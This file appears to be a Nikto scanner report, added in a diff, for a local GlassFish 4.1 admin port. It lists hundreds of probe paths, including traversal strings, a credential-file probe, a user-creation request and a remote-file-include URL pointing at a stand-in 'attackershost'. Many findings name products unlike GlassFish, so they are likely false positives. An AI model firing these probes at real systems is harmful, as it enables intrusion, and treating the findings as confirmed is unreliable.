@@ -1,0 +1,567 @@
+- Nikto v2.6.0
+---------------------------------------------------------------------------
++ Target IP:          127.0.0.1
++ Target Hostname:    127.0.0.1
++ Target Port:        4848
+---------------------------------------------------------------------------
++ SSL Info:           Subject:  /C=US/ST=California/L=Santa Clara/O=Oracle Corporation/OU=GlassFish/CN=localhost
+                      CN:       localhost
+                      Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
+                      Issuer:   /C=US/ST=California/L=Santa Clara/O=Oracle Corporation/OU=GlassFish/CN=localhost
++ Platform:           Unknown
++ Start Time:         2026-08-04 16:31:52 (GMT-4)
+---------------------------------------------------------------------------
++ Server: GlassFish Server Open Source Edition  4.1 
++ ERROR: Failed to check for updates: 403
++ [999986] /: Retrieved x-powered-by header: Servlet/3.1 JSP/2.3 (GlassFish Server Open Source Edition  4.1  Java/Oracle Corporation/1.8).
++ No CGI Directories found (use '-C all' to force check all possible dirs). CGI tests skipped.
++ [013587] /: Suggested security header missing: permissions-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy
++ [013587] /: Suggested security header missing: strict-transport-security. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
++ [013587] /: Suggested security header missing: referrer-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy
++ [013587] /: Suggested security header missing: x-content-type-options. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options
++ [013587] /: Suggested security header missing: content-security-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
++ [999993] /: Hostname '127.0.0.1' does not match certificate names (CN: localhost, SAN: none). See: https://cwe.mitre.org/data/definitions/297.html
++ [000039] /cgi-bin/wrap: Allows viewing of directories.
++ [000040] /forums//admin/config.php: PHP Config file may contain database IDs and passwords.
++ [000040] /forums//adm/config.php: PHP Config file may contain database IDs and passwords.
++ [000040] /forums//administrator/config.php: PHP Config file may contain database IDs and passwords.
++ [000041] /forums/config.php: PHP Config file may contain database IDs and passwords.
++ [000043] /guestbook/guestbookdat: PHP-Gastebuch 1.60 Beta reveals sensitive information about its configuration.
++ [000044] /guestbook/pwd: PHP-Gastebuch 1.60 Beta reveals the md5 hash of the admin password.
++ [000114] /vgn/previewer: Vignette CMS admin/maintenance script available.
++ [000115] /vgn/record/previewer: Vignette CMS admin/maintenance script available.
++ [000116] /vgn/stylepreviewer: Vignette CMS admin/maintenance script available.
++ [000123] /scripts/tools/ctss.idc: This CGI allows remote users to view and modify SQL DB contents, server paths, docroot and more.
++ [000128] /vgn/style: Vignette server may reveal system information through this file. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0401
++ [000130] /SiteServer/Admin/commerce/foundation/domain.asp: Displays known domains of which that server is involved. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1769
++ [000132] /SiteServer/Admin/commerce/foundation/DSN.asp: Displays all DSNs configured for selected ODBC drivers. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1769
++ [000133] /SiteServer/admin/findvserver.asp: Gives a list of installed Site Server components. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1769
++ [000149] /prd.i/pgen/: Has MS Merchant Server 1.0.
++ [000155] /siteseed/: Siteseed pre 1.4.2 have 'major' security problems.
++ [000161] /pccsmysqladm/incs/dbconnect.inc: This file should not be accessible, as it contains database connectivity information. Upgrade to version 1.2.5 or higher.
++ [000162] /iisadmin/: Access to /iisadmin should be restricted to localhost or allowed hosts only.
++ [000164] /PDG_Cart/order.log: PDG Commerce log found. See: http://zodi.com/cgi-bin/shopper.cgi?display=intro&template=Intro/commerce.html
++ [000180] /ows/restricted%2eshow: OWS may allow restricted files to be viewed by replacing a character with its encoded equivalent.
++ [000202] /phpEventCalendar/file_upload.php: phpEventCalendar 1.1 and prior are vulnerable to file upload bug.
++ [000207] /upload.asp: An ASP page that allows attackers to upload files to server.
++ [000208] /uploadn.asp: An ASP page that allows attackers to upload files to server.
++ [000210] /wa.exe: An ASP page that allows attackers to upload files to server.
++ [000215] /vgn/ac/data: Vignette CMS admin/maintenance script available.
++ [000221] /vgn/asp/MetaDataUpdate: Vignette CMS admin/maintenance script available.
++ [000222] /vgn/asp/previewer: Vignette CMS admin/maintenance script available.
++ [000223] /vgn/asp/status: Vignette CMS admin/maintenance script available.
++ [000224] /vgn/asp/style: Vignette CMS admin/maintenance script available.
++ [000226] /vgn/jsp/controller: Vignette CMS admin/maintenance script available.
++ [000243] /MIDICART/midicart.mdb: MIDICART database is available for browsing. This should not be allowed via the web server. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1432
++ [000248] /shopping300.mdb: VP-ASP shopping cart application allows .mdb files (which may include customer data) to be downloaded via the web. These should not be available. See: https://securitytracker.com/id/1004382
++ [000249] /shopping400.mdb: VP-ASP shopping cart application allows .mdb files (which may include customer data) to be downloaded via the web. These should not be available. See: https://securitytracker.com/id/1004382
++ [000252] /database/db2000.mdb: Max Web Portal database is available remotely. It should be moved from the default location to a directory outside the web root. See: https://www.medae.co/en/max/web-app
++ [000258] /adm/config.php: PHP Config file may contain database IDs and passwords.
++ [000294] /sips/sipssys/users/a/admin/user: SIPS v0.2.2 allows user account info (including password) to be retrieved remotely. See: https://vulners.com/exploitdb/EDB-ID:22381
++ [000296] /site/typo3conf/: This may contain sensitive TYPO3 files.
++ [000297] /site/typo3conf/database.sql: TYPO3 SQL file found.
++ [000308] /webcart/orders/: This may allow attackers to read credit card data. Reconfigure to make this dir not accessible via the web. See: https://packetstormsecurity.com/files/32406/xmas.txt.html
++ [000328] /nsn/fdir.bas:ShowVolume: You can use ShowVolume and ShowDirectory directly on the Novell server (NW5.1) to view the filesystem without having to log in.
++ [000334] /cgi/cgiproc?: It may be possible to crash Nortel Contivity VxWorks by requesting '/cgi/cgiproc?$' (not attempted!). Upgrade to version 2.60 or later. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0063
++ [000353] /admin.cgi: InterScan VirusWall administration is accessible without authentication.
++ [000354] /interscan/: InterScan VirusWall administration is accessible without authentication.
++ [000355] /vgn/legacy/save: Vignette Legacy Tool may be unprotected. To access this resource, set a cookie called 'vgn_creds' with any value.
++ [000358] /quikstore.cfg: Shopping cart config file, http://www.quikstore.com/, http://www.mindsec.com/advisories/post2.txt. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0607
++ [000361] /siteminder: This may be an indication that the server is running Siteminder for SSO.
++ [000362] /webmail/: Web based mail package installed.
++ [000365] /smg_Smxcfg30.exe?vcc=3560121183d3: This may be a Trend Micro Officescan 'backdoor'.
++ [000400] /upd/: WASD Server can allow directory listings by requesting /upd/directory/. Upgrade to a later version and secure according to the documents on the WASD web site.
++ [000405] /CVS/Entries: CVS Entries file may contain directory listing information.
++ [000451] /cgi-bin/cgi_process: WASD reveals a lot of system information in this script. It should be removed.
++ [000455] /tree: WASD Server reveals the entire web root structure and files via this URL. Upgrade to a later version and secure according to the documents on the WASD web site.
++ [000485] /contents/extensions/asp/1: The IIS system may be vulnerable to a DOS. See: https://docs.microsoft.com/en-us/security-updates/securitybulletins/2002/MS02-018
++ [000486] /WebAdmin.dll?View=Logon: Some versions of WebAdmin are vulnerable to a remote DoS (not tested). See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1247
++ [000501] /cgi-shl/win-c-sample.exe: win-c-sample.exe has a buffer overflow.
++ [000671] /..\..\..\..\..\..\temp\temp.class: Cisco ACS 2.6.x and 3.0.1 (build 40) allows authenticated remote users to retrieve any file from the system. Upgrade to the latest version.
++ [000684] /My_eGallery/public/displayCategory.php: My_eGallery prior to 3.1.1.g are vulnerable to a remote execution bug via SQL command injection. displayCategory.php calls imageFunctions.php without checking URL/location arguments. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-6795
++ [000684] /forum/My_eGallery/public/displayCategory.php: My_eGallery prior to 3.1.1.g are vulnerable to a remote execution bug via SQL command injection. displayCategory.php calls imageFunctions.php without checking URL/location arguments. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-6795
++ [000949] /cbms/cbmsfoot.php: CBMS Billing Management has had many vulnerabilities in versions 0.7.1 and below. None could be confirmed here, but they should be manually checked if possible. http://freshmeat.net/projects/cbms/.
++ [000953] /cbms/realinv.php: CBMS Billing Management has had many vulnerabilities in versions 0.7.1 and below. None could be confirmed here, but they should be manually checked if possible. http://freshmeat.net/projects/cbms/.
++ [000954] /cbms/usersetup.php: CBMS Billing Management has had many vulnerabilities in versions 0.7.1 and below. None could be confirmed here, but they should be manually checked if possible. http://freshmeat.net/projects/cbms/.
++ [000970] /dcshop/orders/orders.txt: The DCShop installation allows credit card numbers to be viewed remotely. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0821 https://packetstormsecurity.com/files/32406/xmas.txt.html
++ [000986] /Admin_files/order.log: Selena Sol's WebStore 1.0 exposes order information. See: https://packetstormsecurity.com/files/32406/xmas.txt.html
++ [000988] /admin/cplogfile.log: DevBB 1.0 final log file is readable remotely. Upgrade to the latest version. See: http://www.mybboard.com
++ [000989] /admin/system_footer.php: myphpnuke version 1.8.8_final_7 reveals detailed system information.
++ [000990] /cfdocs/snippets/fileexists.cfm: Can be used to verify the existence of files (on the same drive info as the web tree/file).
++ [000991] /cgi-bin/MachineInfo: Gives out information on the machine.
++ [000994] /chat/data/usr: SimpleChat! 1.3 allows retrieval of user information.
++ [000998] /config/: Configuration information may be available remotely.
++ [001001] /examples/jsp/snp/anything.snp: Tomcat servlet gives lots of host information.
++ [001013] /cfide/Administrator/startstop.html: Can start/stop the Coldfusion server.
++ [001069] /cgi-bin/handler: This program allows remote users to run arbitrary commands.
++ [001071] /cgi-bin/webdist.cgi: This program allows remote users to run arbitrary commands. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0039
++ [001082] /admin.php?en_log_id=0&action=config: EasyNews version 4.3 allows remote admin access. This PHP file should be protected. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5412
++ [001084] /admin.php4?reg_login=1: Mon Album version 0.6.2d allows remote admin access. This should be protected.
++ [001115] /structure.sql: Database SQL?.
++ [001121] /level/42/exec/show%20conf: Retrieved Cisco configuration file.
++ [001127] /logs/str_err.log: Bmedia error log, contains invalid login attempts which include the invalid usernames and passwords entered (could just be typos & be very close to the right entries).
++ [001128] /mall_log_files/order.log: EZMall2000 exposes order information. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0606
++ [001150] /SiteScope/htdocs/SiteScope.html: The SiteScope install may allow remote users to get sensitive information about the hosts being monitored. See: https://web.archive.org/web/20200229143457/https://www.securityfocus.com/bid/49345/discuss
++ [001155] /isapi/count.pl?: AN HTTPd default script may allow writing over arbitrary files with a new content of '1', which could allow a trivial DoS. Append /../../../../../ctr.dll to replace this file's contents, for example.
++ [001157] /logjam/showhits.php: Logjam may possibly allow remote command execution via showhits.php page.
++ [001189] /_vti_pvt/doctodep.btr: FrontPage file found. This may contain useful information.
++ [001190] /_vti_pvt/services.org: FrontPage file found. This may contain useful information.
++ [001192] /_vti_bin/shtml.exe/_vti_rpc?method=server+version%3a4%2e0%2e2%2e2611: Gives info about server settings. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0413,https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0709,https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0710
++ [001201] /_vti_pvt/service.cnf: Contains meta-information about the web server Remove or ACL if FrontPage is not being used. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1717
++ [001214] /doc: The /doc directory is browsable. This may be /usr/doc. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0678
++ [001222] /cgis/wwwboard/wwwboard.pl: Versions 2.0 Alpha and below have multiple problems. This could allow over-write of messages. Default ID 'WebAdmin' with pass 'WebBoard'. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0930
++ [001233] /ab2/\@AdminViewError: Sun Answerbook allows viewing of the error logs without authentication. See: https://www.exploit-db.com/exploits/21677
++ [001239] /ab2/\@AdminAddadmin?uid=foo&password=bar&re_password=bar: Sun Answerbook may allow users to be created without proper authentication first. Attempted to add user 'foo' with password 'bar'. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0696
++ [001260] /level/16/level/16/exec//show/interfaces/status: CISCO HTTP service allows remote execution of commands. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0537
++ [001263] /level/16/exec//show: CISCO HTTP service allows remote execution of commands. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0537
++ [001265] /level/18/exec//show: CISCO HTTP service allows remote execution of commands. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0537
++ [001266] /level/19/exec//show: CISCO HTTP service allows remote execution of commands. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0537
++ [001274] /level/27/exec//show: CISCO HTTP service allows remote execution of commands. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0537
++ [001276] /level/29/exec//show: CISCO HTTP service allows remote execution of commands. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0537
++ [001282] /level/35/exec//show: CISCO HTTP service allows remote execution of commands. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0537
++ [001285] /level/38/exec//show: CISCO HTTP service allows remote execution of commands. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0537
++ [001287] /level/40/exec//show: CISCO HTTP service allows remote execution of commands. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0537
++ [001288] /level/41/exec//show: CISCO HTTP service allows remote execution of commands. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0537
++ [001294] /level/47/exec//show: CISCO HTTP service allows remote execution of commands. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0537
++ [001297] /level/50/exec//show: CISCO HTTP service allows remote execution of commands. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0537
++ [001298] /level/51/exec//show: CISCO HTTP service allows remote execution of commands. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0537
++ [001310] /level/63/exec//show: CISCO HTTP service allows remote execution of commands. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0537
++ [001312] /level/65/exec//show: CISCO HTTP service allows remote execution of commands. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0537
++ [001320] /level/73/exec//show: CISCO HTTP service allows remote execution of commands. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0537
++ [001321] /level/74/exec//show: CISCO HTTP service allows remote execution of commands. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0537
++ [001324] /level/77/exec//show: CISCO HTTP service allows remote execution of commands. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0537
++ [001325] /level/78/exec//show: CISCO HTTP service allows remote execution of commands. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0537
++ [001327] /level/80/exec//show: CISCO HTTP service allows remote execution of commands. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0537
++ [001328] /level/81/exec//show: CISCO HTTP service allows remote execution of commands. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0537
++ [001332] /level/85/exec//show: CISCO HTTP service allows remote execution of commands. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0537
++ [001334] /level/87/exec//show: CISCO HTTP service allows remote execution of commands. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0537
++ [001337] /level/90/exec//show: CISCO HTTP service allows remote execution of commands. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0537
++ [001340] /level/93/exec//show: CISCO HTTP service allows remote execution of commands. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0537
++ [001341] /level/94/exec//show: CISCO HTTP service allows remote execution of commands. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0537
++ [001357] /lcgi/lcgitest.nlm: Novell web server shows the server environment. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2104
++ [001358] /com/: Novell web server allows directory listing. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2106
++ [001410] /publisher/: Netscape Enterprise Server with Web Publishing can allow attackers to edit web pages and/or list arbitrary directories via Java applet. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0237
++ [001455] /wwwboard/passwd.txt: The wwwboard password file is browsable. Change wwwboard to store this file elsewhere, or upgrade to the latest version. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0930
++ [001463] /photodata/: My Photo Gallery pre 3.6 contains multiple vulnerabilities including directory traversal, unspecified vulnerabilities and remote management interface access. See: OSVDB-2695
++ [001474] /msadc/msadcs.dll: . See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1011 https://docs.microsoft.com/en-us/security-updates/securitybulletins/2098/MS98-004 https://docs.microsoft.com/en-us/security-updates/securitybulletins/2099/MS99-025 http://attrition.org/security/advisory/individual/rfp/rfp.9902.rds_iis
++ [001507] /c32web.exe/ChangeAdminPassword: This CGI may contain a backdoor and may allow attackers to change the Cart32 admin password. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0429
++ [001511] /iissamples/exair/search/query.asp: Scripts within the Exair package on IIS 4 can be used for a DoS against the server. See: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0449
++ [001533] /sqlnet.log: Oracle log file found.
++ [001538] /access.log: This might be interesting.
++ [001540] /access_log: This might be interesting.
++ [001546] /admin.htm: This might be interesting.
++ [001548] /admin.php: This might be interesting.
++ [001550] /admin.shtml: This might be interesting.
++ [001560] /Agents/: This might be interesting.
++ [001561] /analog/: This might be interesting.
++ [001563] /app/: This might be interesting.
++ [001564] /applicattion/: This might be interesting.
++ [001572] /Asp/: This might be interesting.
++ [001575] /awebvisit.stat: This might be interesting.
++ [001579] /bak/: This might be interesting.
++ [001581] /banco/: This might be interesting.
++ [001582] /bank/: This might be interesting.
++ [001593] /caja/: This might be interesting.
++ [001595] /cards/: This might be interesting.
++ [001599] /ccbill/secure/ccbill.log: CC Bill log file. Seen in carding forums. See: https://packetstormsecurity.com/files/32406/xmas.txt.html
++ [001606] /cfdocs/exampleapp/email/application.cfm: This might be interesting.
++ [001607] /cfdocs/exampleapp/publish/admin/addcontent.cfm: This might be interesting.
++ [001614] /clientes/: This might be interesting.
++ [001618] /communicator/: This might be interesting.
++ [001622] /conecta/: This might be interesting.
++ [001631] /css/: This might be interesting.
++ [001633] /cuentas/: This might be interesting.
++ [001637] /data/: This might be interesting.
++ [001638] /dato/: This might be interesting.
++ [001647] /dir/: This might be interesting.
++ [001652] /download/: This might be interesting.
++ [001658] /envia/: This might be interesting.
++ [001668] /fileadmin/: This might be interesting.
++ [001669] /files/: This might be interesting.
++ [001674] /fpadmin/: This might be interesting.
++ [001676] /gfx/: This might be interesting.
++ [001677] /global/: This might be interesting.
++ [001679] /guest/: This might be interesting.
++ [001685] /hits.txt: This might be interesting.
++ [001694] /ibill/: This might be interesting.
++ [001699] /imgs/: This might be interesting.
++ [001706] /information/: This might be interesting.
++ [001707] /ingresa/: This might be interesting.
++ [001709] /install/: This might be interesting.
++ [001711] /intranet/: This might be interesting.
++ [001716] /jdbc/: This might be interesting.
++ [001719] /js: This might be interesting.
++ [001721] /library/: This might be interesting.
++ [001722] /libro/: This might be interesting.
++ [001730] /logfile.txt: This might be interesting.
++ [001735] /logging/: This might be interesting.
++ [001736] /login/: This might be interesting.
++ [001737] /logs.txt: This might be interesting.
++ [001744] /marketing/: This might be interesting.
++ [001752] /mkstats/: This might be interesting.
++ [001768] /odbc/: This might be interesting.
++ [001770] /old/: This might be interesting.
++ [001775] /orders/checks.txt: Seen in carding forums. See: https://packetstormsecurity.com/files/32406/xmas.txt.html
++ [001778] /orders/orders.txt: Seen in carding forums. See: https://packetstormsecurity.com/files/32406/xmas.txt.html
++ [001780] /ows/: This might be interesting: Oracle Web Services?.
++ [001787] /password: This might be interesting.
++ [001793] /perl5/: This might be interesting.
++ [001800] /poll: This might be interesting.
++ [001801] /polls: This might be interesting.
++ [001802] /porn/: This might be interesting.
++ [001809] /pruebas/: This might be interesting.
++ [001812] /publica/: This might be interesting.
++ [001822] /readme.txt: This might be interesting.
++ [001826] /reseller/: This might be interesting.
++ [001839] /search97.vts: This might be interesting.
++ [001850] /shop/: This might be interesting.
++ [001851] /shopper/: This might be interesting.
++ [001853] /solaris/: This might be interesting.
++ [001855] /Sources/: This might be interesting: may be YaBB.
++ [001856] /spwd: This might be interesting.
++ [001860] /ss.cfg: This might be interesting.
++ [001879] /sun/: This might be interesting.
++ [001885] /system/: This might be interesting.
++ [001886] /tar/: This might be interesting.
++ [001887] /tarjetas/: This might be interesting.
++ [001890] /temporal/: This might be interesting.
++ [001893] /test.txt: This might be interesting.
++ [001895] /testing/: This might be interesting.
++ [001904] /trees/: This might be interesting.
++ [001915] /web/: This might be interesting.
++ [001916] /web800fo/: This might be interesting.
++ [001918] /webaccess/access-options.txt: This might be interesting.
++ [001924] /weblog/: This might be interesting.
++ [001925] /weblogs/: This might be interesting.
++ [001929] /WebShop/templates/cc.txt: Seen in carding forums. See: https://packetstormsecurity.com/files/32406/xmas.txt.html
++ [001938] /wusage/: This might be interesting.
++ [001942] /wwwboard/wwwboard.pl: This might be interesting.
++ [001945] /wwwstats.html: This might be interesting.
++ [001946] /wwwstats/: This might be interesting.
++ [001947] /wwwthreads/3tvars.pm: This might be interesting.
++ [001948] /wwwthreads/w3tvars.pm: This might be interesting.
++ [002082] /mspress30/: Microsoft Site Server sample files may have SQL injection. See: https://github.com/sullo/advisory-archives/blob/master/RFP2201.txt
++ [002084] /sam.bin: This might be interesting.
++ [002085] /sam._: This might be interesting.
++ [002086] /samples/search/queryhit.htm: This might be interesting.
++ [002090] /scripts/postinfo.asp: This might be interesting.
++ [002091] /scripts/samples/ctguestb.idc: This might be interesting.
++ [002095] /_mem_bin/: This might be interesting: user login.
++ [002097] /perl/files.pl: This might be interesting.
++ [002110] /java-sys/: Default Java directory should not allow directory listing.
++ [002268] /acartpath/signin.asp?|-|0|404_Object_Not_Found: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002269] /add_acl: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002279] /admin/index.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002281] /admin/objects.inc.php4: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002289] /approval/ts_app.htm: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002301] /board/index.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002304] /bugtest+/+: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002311] /community/index.php?analized=anything: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002323] /database/metacart.mdb+: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002324] /db.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002326] /dcp/advertiser.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002329] /doc/admin/index.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002332] /dotproject/modules/projects/addedit.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002333] /dotproject/modules/projects/view.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002334] /dotproject/modules/projects/vw_files.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002344] /etc/shadow+: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002345] /eventcal2.php.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002346] /ez2000/ezadmin.cgi: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002350] /filemanager/index.php3: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002468] /forum_professionnel.asp?n=100: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002476] /homebet/homebet.dll?form=menu&amp;option=menu-signin: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002478] /idealbb/error.asp?|-|0|404_Object_Not_Found: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002494] /includes/header.php3: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002502] /infos/faq/index.asp: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002506] /intranet/browse.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002507] /invitefriends.php3: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002510] /jsptest.jsp+: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002512] /kernel/classes/ezrole.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002514] /livredor/index.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002521] /manage/login.asp+: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002522] /mantis/summary_graph_functions.php?g_jpgraph_path=http%3A%2F%2Fattackershost%2Flistings.txt%3F: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002526] /modif/delete.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002540] /modules/Forums/attachment.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002541] /modules/Search/index.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002548] /msadc/Samples/SELECTOR/showcode.asp?|-|0|404_Object_Not_Found: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002549] /myguestBk/add1.asp?|-|0|404_Object_Not_Found: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002554] /nphp/nphpd.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002557] /oscommerce/default.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002560] /php/php4ts.dll: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002564] /produccart/pdacmin/login.asp?|-|0|404_Object_Not_Found: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002565] /productcart/database/EIPC.mdb: Seen in carding forums. See: https://packetstormsecurity.com/files/32406/xmas.txt.html
++ [002575] /pt_config.inc: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002579] /room/save_item.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002592] /screen.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002599] /shop/php_files/site.config.php+: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002601] /shop/show.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002604] /site_searcher.cgi: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002622] /site/typo3/dev/translations.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002622] /typo/typo3/dev/translations.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002623] /uifc/MultFileUploadHandler.php+: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002624] /url.jsp: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002625] /useraction.php3: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002631] /wbboard/reply.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002637] /XMBforum/buddy.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002638] /XMBforum/member.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002640] /yabbse/Reminder.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002642] /zentrack/index.php: This might be interesting: has been seen in web logs from an unknown scanner.
++ [002739] /.htpasswd: Contains authorization information.
++ [002741] /.addressbook: PINE addressbook, may store sensitive e-mail address contact information and notes.
++ [002743] /.bash_history: A user's home directory may be set to the web root, the shell history was retrieved. This should not be accessible via the web.
++ [002745] /.history: A user's home directory may be set to the web root, the shell history was retrieved. This should not be accessible via the web.
++ [002747] /.lynx_cookies: User home dir found with LYNX cookie file. May reveal cookies received from arbitrary web sites.
++ [002749] /.passwd: Contains authorization information.
++ [002756] /.sh_history: A user's home directory may be set to the web root, the shell history was retrieved. This should not be accessible via the web.
++ [002757] /.ssh: A user's home directory may be set to the web root, an ssh file was retrieved. This should not be accessible via the web.
++ [002758] /.ssh/authorized_keys: A user's home directory may be set to the web root, an ssh file was retrieved. This should not be accessible via the web.
++ [002759] /.ssh/known_hosts: A user's home directory may be set to the web root, an ssh file was retrieved. This should not be accessible via the web.
++ [002785] /tomcat-docs/index.html: Default Apache Tomcat documentation found. See: CWE-552
++ [002812] /admcgi/contents.htm: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage
++ [002813] /admcgi/scripts/Fpadmcgi.exe: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage
++ [002818] /bin/contents.htm: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage
++ [002819] /bin/fpadmin.htm: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage
++ [002822] /cgi-bin/admin.pl: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage
++ [002824] /cgi-bin/CGImail.exe: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage
++ [002826] /cgi-bin/fpadmin.htm: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage
++ [002834] /scripts/fpcount.exe: Default FrontPage CGI found. See: https://en.wikipedia.org/wiki/Microsoft_FrontPage
